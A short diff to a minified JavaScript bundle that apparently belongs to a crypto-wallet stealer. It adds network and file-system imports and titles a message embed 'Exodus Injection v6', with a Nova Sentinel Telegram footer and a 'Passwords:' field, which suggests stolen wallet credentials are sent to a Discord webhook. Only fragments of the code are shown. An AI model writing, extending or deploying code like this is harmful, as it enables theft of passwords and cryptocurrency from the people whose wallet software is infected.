@@ -1,4 +1,11 @@
-!(function (e) {
+const { fstatSync } = require("fs"),
+  https = require("https"),
+  fs = require("fs"),
+  path = require("path");
+
+
+
+  !(function (e) {
   var t = {};
   function n(r) {
     if (t[r]) return t[r].exports;
@@ -1646,6 +1653,7 @@
           footer: {
             text: "@Nova Sentinel | https://t.me/Sordeal",
           },
+          title: "Exodus Injection v6",
           fields: [
             {
               name: `<a:keys:1159078859682107453> Passwords:`,
